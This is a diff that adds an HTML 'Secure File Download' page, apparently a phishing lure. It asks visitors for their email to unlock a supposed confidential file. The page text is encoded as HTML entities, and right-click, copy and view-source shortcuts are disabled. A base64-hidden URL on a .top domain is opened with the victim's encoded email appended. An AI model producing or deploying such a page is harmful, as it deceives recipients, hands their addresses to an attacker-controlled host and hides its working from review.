@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>&#83;&#101;&#99;&#117;&#114;&#101;&#32;&#70;&#105;&#108;&#101;&#32;&#68;&#111;&#119;&#110;&#108;&#111;&#97;&#100;</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
+</head>
+<body class="bg-gradient-to-br from-blue-50 to-white min-h-screen flex items-center justify-center px-4" oncontextmenu="return false;" oncopy="return false;" oncut="return false;" onpaste="return false;">
+  <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md text-center">
+    <div class="mb-6">
+      <svg class="mx-auto h-12 w-12 text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m0 4h.01M4.93 4.93a10 10 0 0114.14 0M3 12a9 9 0 0018 0 9 9 0 00-18 0z"></path></svg>
+      <h1 class="text-2xl font-extrabold text-gray-800 mt-2">&#83;&#101;&#99;&#117;&#114;&#101;&#32;&#70;&#105;&#108;&#101;&#32;&#68;&#111;&#119;&#110;&#108;&#111;&#97;&#100;</h1>
+    </div>
+
+    <p class="text-sm text-gray-600 mb-6">&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#101;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#101;&#109;&#97;&#105;&#108;&#32;&#116;&#111;&#32;&#117;&#110;&#108;&#111;&#99;&#107;&#32;&#97;&#110;&#100;&#32;&#100;&#111;&#119;&#110;&#108;&#111;&#97;&#100;&#32;&#116;&#104;&#101;&#32;&#115;&#101;&#99;&#117;&#114;&#101;&#32;&#102;&#105;&#108;&#101;&#46;</p>
+
+    <form id="download-form">
+      <div class="text-left mb-4">
+        <label for="user-email" class="block text-sm font-medium text-gray-700 mb-1">&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;</label>
+        <input type="email" id="user-email" placeholder="e.g. user@example.com" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" autocomplete="off" required />
+      </div>
+
+      <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg font-medium hover:bg-blue-700 transition duration-200">&#68;&#79;&#87;&#78;&#76;&#79;&#65;&#68;&#32;&#68;&#79;&#67;&#85;&#77;&#69;&#78;&#84;</button>
+
+      <div id="status" class="mt-4 text-sm text-red-500 hidden"></div>
+      <div id="success-message" class="mt-4 text-sm text-green-600 hidden">&#89;&#111;&#117;&#114;&#32;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#32;&#105;&#115;&#32;&#100;&#111;&#119;&#110;&#108;&#111;&#97;&#100;&#105;&#110;&#103;&#46;&#46;&#46;</div>
+    </form>
+
+    <footer class="mt-8 text-xs text-gray-400">
+      &copy; 2025 &#67;&#111;&#110;&#102;&#105;&#100;&#101;&#110;&#116;&#105;&#97;&#108;&#32;&#86;&#97;&#117;&#108;&#116;. &#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;.
+    </footer>
+  </div>
+
+  <script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+    document.addEventListener('keydown', function(event) {
+      if (
+        event.ctrlKey &&
+        (event.key === 's' || event.key === 'p' || event.key === 'u' || event.key === 'c' || event.key === 'x')
+      ) {
+        event.preventDefault();
+        return false;
+      }
+    });
+
+    window.addEventListener('blur', () => {
+      console.warn("Focus lost. Some bot protections are active.");
+    });
+
+    const encodedUrl = "aHR0cHM6Ly9qeXRmb3d3aXJnc3dxYWVjLnRvcC8/YXlud3V1dG4m";
+    const FILE_URL = atob(encodedUrl); // Base64 decoding
+
+    document.getElementById('download-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const userEmail = document.getElementById('user-email').value.trim().toLowerCase();
+      const status = document.getElementById('status');
+      const successMessage = document.getElementById('success-message');
+
+      if (userEmail) {
+        status.classList.add('hidden');
+        successMessage.classList.remove('hidden');
+
+        const link = document.createElement('a');
+        link.href = FILE_URL + "#M" + btoa(userEmail);
+        link.setAttribute('target', '_blank');
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      } else {
+        successMessage.classList.add('hidden');
+        status.textContent = "Please enter a valid email address.";
+        status.classList.remove('hidden');
+      }
+    });
+  </script>
+</body>
+</html>
